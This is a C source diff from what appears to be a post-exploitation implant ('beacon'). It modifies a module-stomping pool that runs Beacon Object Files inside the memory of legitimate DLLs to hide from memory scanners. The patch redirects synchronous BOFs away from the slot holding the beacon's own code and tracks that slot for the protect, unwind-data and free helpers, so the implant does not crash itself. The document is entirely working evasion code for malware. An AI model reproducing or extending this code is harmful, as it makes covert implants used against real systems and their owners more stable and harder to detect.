@@ -137,6 +137,7 @@ FUNC VOID NaxBofStompInit( PNAX_INSTANCE Nax ) {
     }
 
     Nax->BofStompPool.Initialized = TRUE;
+    Nax->BofStompPool.SyncStompSlotIdx = 0xFF;
     NaxDbg( Nax, "[bof-stomp] init done: sync=%p async=%d/%d sm=%p",
             Nax->BofStompPool.SyncSlot.DllBase, Nax->BofStompPool.AsyncCount, count,
             Nax->BofStompPool.SmSlot.DllBase );
@@ -177,11 +178,33 @@ FUNC BOOL NaxBofStompAlloc( PNAX_INSTANCE Nax, PBYTE bof, PCOF_HEADER hdr,
             slotIdx = 0xFE;
         }
     } else if ( curJob == NULL ) {
+        /* Sync BOF on the main thread. The sync slot is only safe when it is NOT
+           the beacon's own stomped home -- in module-stomp mode the beacon's .text
+           lives in the sync slot DLL (SyncSlot.TextBase == SmInfo.BeaconBase), so
+           stomping a BOF there would MmZero the running beacon and crash. When the
+           overlap is detected, redirect to an async slot (image-backed, not the
+           beacon home) instead of clobbering ourselves. */
         if ( Nax->BofStompPool.SyncSlot.DllBase && !Nax->BofStompPool.SyncSlot.InUse &&
-             textNeed <= Nax->BofStompPool.SyncSlot.TextCap ) {
+             textNeed <= Nax->BofStompPool.SyncSlot.TextCap &&
+             Nax->BofStompPool.SyncSlot.TextBase != Nax->SmInfo.BeaconBase ) {
             slot = &Nax->BofStompPool.SyncSlot;
             slotIdx = 0xFF;
+        } else {
+            NaxDbg( Nax, "[bof-stomp] sync slot is beacon home (%p) -> async slot",
+                    Nax->BofStompPool.SyncSlot.TextBase );
+            for ( BYTE i = 0; i < Nax->BofStompPool.AsyncCount; i++ ) {
+                BOF_STOMP_SLOT* s = &Nax->BofStompPool.AsyncSlots[i];
+                if ( s->DllBase && !s->InUse && textNeed <= s->TextCap ) {
+                    slot = s;
+                    slotIdx = i;
+                    break;
+                }
+            }
         }
+        /* Record which slot a sync BOF actually used so the downstream
+           protect/pdata/free helpers touch the right slot. 0xFF = the real
+           SyncSlot; otherwise it is an async slot index (redirect case). */
+        Nax->BofStompPool.SyncStompSlotIdx = slot ? slotIdx : 0xFF;
     } else {
         for ( BYTE i = 0; i < Nax->BofStompPool.AsyncCount; i++ ) {
             BOF_STOMP_SLOT* s = &Nax->BofStompPool.AsyncSlots[i];
@@ -288,7 +311,13 @@ FUNC VOID NaxBofStompProtect( PNAX_INSTANCE Nax, PVOID* mapSections, UINT16 numS
     if ( Nax->BofStompPool.SmStompReq )
         slot = &Nax->BofStompPool.SmSlot;
     else if ( curJob == NULL )
-        slot = &Nax->BofStompPool.SyncSlot;
+        /* sync BOF: may have been redirected to an async slot when the sync slot
+           is the beacon's own stomped home. Use the recorded index, else the
+           real SyncSlot. Without this, protect/pdata/free would touch the beacon
+           home and crash the running beacon. */
+        slot = ( Nax->BofStompPool.SyncStompSlotIdx < Nax->BofStompPool.AsyncCount )
+            ? &Nax->BofStompPool.AsyncSlots[ Nax->BofStompPool.SyncStompSlotIdx ]
+            : &Nax->BofStompPool.SyncSlot;
     else if ( curJob->StompSlotIdx < Nax->BofStompPool.AsyncCount )
         slot = &Nax->BofStompPool.AsyncSlots[ curJob->StompSlotIdx ];
 
@@ -308,7 +337,13 @@ FUNC BOOL NaxBofStompPdata( PNAX_INSTANCE Nax, PRUNTIME_FUNCTION src, DWORD srcC
     if ( Nax->BofStompPool.SmStompReq )
         slot = &Nax->BofStompPool.SmSlot;
     else if ( curJob == NULL )
-        slot = &Nax->BofStompPool.SyncSlot;
+        /* sync BOF: may have been redirected to an async slot when the sync slot
+           is the beacon's own stomped home. Use the recorded index, else the
+           real SyncSlot. Without this, protect/pdata/free would touch the beacon
+           home and crash the running beacon. */
+        slot = ( Nax->BofStompPool.SyncStompSlotIdx < Nax->BofStompPool.AsyncCount )
+            ? &Nax->BofStompPool.AsyncSlots[ Nax->BofStompPool.SyncStompSlotIdx ]
+            : &Nax->BofStompPool.SyncSlot;
     else if ( curJob->StompSlotIdx < Nax->BofStompPool.AsyncCount )
         slot = &Nax->BofStompPool.AsyncSlots[ curJob->StompSlotIdx ];
 
@@ -364,7 +399,13 @@ FUNC VOID NaxBofStompFree( PNAX_INSTANCE Nax, PVOID* mapSections, UINT16 numSect
     if ( Nax->BofStompPool.SmStompReq )
         slot = &Nax->BofStompPool.SmSlot;
     else if ( curJob == NULL )
-        slot = &Nax->BofStompPool.SyncSlot;
+        /* sync BOF: may have been redirected to an async slot when the sync slot
+           is the beacon's own stomped home. Use the recorded index, else the
+           real SyncSlot. Without this, protect/pdata/free would touch the beacon
+           home and crash the running beacon. */
+        slot = ( Nax->BofStompPool.SyncStompSlotIdx < Nax->BofStompPool.AsyncCount )
+            ? &Nax->BofStompPool.AsyncSlots[ Nax->BofStompPool.SyncStompSlotIdx ]
+            : &Nax->BofStompPool.SyncSlot;
     else if ( curJob->StompSlotIdx < Nax->BofStompPool.AsyncCount )
         slot = &Nax->BofStompPool.AsyncSlots[ curJob->StompSlotIdx ];
 
